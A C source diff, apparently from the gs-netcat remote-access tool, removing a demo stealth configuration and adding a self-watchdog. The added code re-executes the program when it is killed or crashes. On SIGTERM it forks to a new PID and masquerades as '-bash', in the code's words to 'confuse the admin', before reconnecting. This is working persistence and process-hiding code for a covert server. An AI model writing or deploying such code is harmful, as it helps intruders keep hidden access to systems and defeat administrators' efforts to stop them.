@@ -164,16 +164,6 @@ err:
     return ret;
 }
 
-static void
-gs_config_demo(void) {
-    gopt.sec_str = "SecretChangeMe";
-    gopt.proc_hiddenname = "[THC-MEMEXEC]";
-    // gopt.flags |= GSC_FL_OPT_DAEMON;
-    gopt.flags |= GSC_FL_IS_SERVER;
-    gopt.flags |= GSC_FL_IS_STEALTH;
-    gopt.flags |= GSC_FL_CONFIG_READ_OK;
-    gopt.is_interactive = 1;
-}
 // Return 0 if config could be read EOF of fn
 int
 GSNC_config_read(const char *fn) {
@@ -538,4 +528,127 @@ done:
 	char str[2 + GS_ID_SIZE * 2 + 1];
 	snprintf(str, sizeof str, "0x%16s", GS_bin2hex(buf, sizeof buf, mdres, sizeof mdres));
 	return strdup(str);
+}
+
+
+struct _self_wd {
+	int last_sec;
+	int n_force_exit;
+    char buf[64];
+    char *argv[2];
+};
+
+static struct _self_wd swd;
+
+// We monitor ourselves and re-execute ourselves on exit.
+// - Let the new process know how many BAD-AUTH we already received.
+// - Called from cb_atexit()
+// - Might be called from SIGSEGV: We are on thin ice here. Trust .bss but nothing else.
+void
+SWD_reexec(void) {
+	if (!(gopt.flags & GSC_FL_SELF_WATCHDOG))
+        return;
+
+	if (!(gopt.flags & GSC_FL_IS_SERVER))
+        return;
+
+    swd.n_force_exit += 1;
+    snprintf(swd.buf, sizeof swd.buf, "%d:%d:%d", swd.last_sec, swd.n_force_exit, gopt.exit_code);
+    setenv("_GS_SWD", swd.buf, 1);
+
+    swd.argv[0] = gopt.proc_hiddenname?:GSNC_PROC_HN_SIGTERM;
+    if (gopt.exit_code == EX_SIGTERM) {
+        // Confuse the admin: change PID on SIGTERM and argv0 to '-bash '.
+        if (fork() > 0)
+            _exit(0); // do not call cb_atexit().
+        swd.argv[0] = GSNC_PROC_HN_SIGTERM;
+    }
+
+    // Close ALL fds:
+    for (int i = 0; i < MIN(getdtablesize(), FD_SETSIZE); i++)
+		close(i);
+    gopt.err_fp = NULL;
+    gopt.log_fp = NULL;
+
+    if (gopt.prg_exename) {
+        execv(gopt.prg_exename, swd.argv);
+        DEBUGF("execv(): %s\n", strerror(errno));
+    }
+    
+    execv("/proc/self/exe", swd.argv);
+    DEBUGF("execv(/proc/self/exe): %s\n", strerror(errno));
+    // FATAL: We failed to watchdog/restart ourselves.
+    // caller (cb_exit/cb_sigsegv) will exit() hard for us.
+	return;
+}
+
+// Called to initilize SWD.
+// Called after re-exec by SWD_reexec().
+void
+SWD_wait(void) {
+    char *ptr;
+    char *ptr2;
+    char *ptr3;
+    int last_sec;
+    int ec;
+
+    // Initialize our timer:
+    gettimeofday(&gopt.tv_now, NULL);
+    swd.last_sec = gopt.tv_now.tv_sec;
+
+    // <seconds:n_force_times> 
+    if ((ptr = getenv("_GS_SWD")) == NULL)
+        return;
+
+    if ((ptr2 = strchr(ptr, ':')) == NULL)
+        return;
+    
+    *ptr2 = '\0';
+    ptr2++;
+
+    if ((ptr3 = strchr(ptr2, ':')) == NULL)
+        return;
+    *ptr3 = '\0';
+    ptr3++;
+
+    last_sec = atoi(ptr);
+    swd.n_force_exit = atoi(ptr2);
+    ec = atoi(ptr3);
+
+    gettimeofday(&gopt.tv_now, NULL);
+    int diff = gopt.tv_now.tv_sec - last_sec;
+    int n = 3 * 60;
+    if (diff > 10 * 60) {
+        // GSRN may wait for GSRN_BAD_AUTH_DELAY=240 + GSRN_BAD_AUTH_JITTER=10 seconds
+        // before it receives a BAD-AUTH. At least > 240+10 seconds shall pass before connecting
+        // without sleep.
+        swd.n_force_exit = 0;
+        n = 0;
+    }
+
+    if (ec == EX_BAD_AUTH) {
+        if (swd.n_force_exit == 1) {
+            // Note: Host reboot may cause the FIN/RST to be lost. GSNC will think that the old GSNC is still
+            // connected until GSRN_MSG_TIMEOUT. First wait for 7 seconds, then longer.
+            n = GSRN_TOKEN_LINGER_SEC + 3; // If BAD-AUTH then only wait long enough for GSRN to drop auth token (7 seconds)
+        } else if (swd.n_force_exit > 1) {
+            n = GSRN_DEFAULT_PING_INTERVAL + 10;
+        }
+    } else {
+        swd.n_force_exit = 0;
+        if (ec == EX_SIGTERM) {
+            n = GS_SIGTERM_START_DELAY; // on SIGTERM always wait before re-connecting.
+        }
+    }
+
+    GS_LOG("***DIED after %d seconds with code=%d***. Restarting in %d second%s. (BAD-AUTH count: %d)\n", diff, ec, n, n>1?"s":"", swd.n_force_exit);
+    if (swd.n_force_exit >= 3) {
+        GS_LOG("Exiting. Max %d BAD-AUTH received\n", swd.n_force_exit);
+        _exit(0);
+    }
+
+    sleep(n);
+    gettimeofday(&gopt.tv_now, NULL);
+    swd.last_sec = gopt.tv_now.tv_sec;
+    gopt.flags |= GSC_FL_SELF_WATCHDOG; // implied
 }
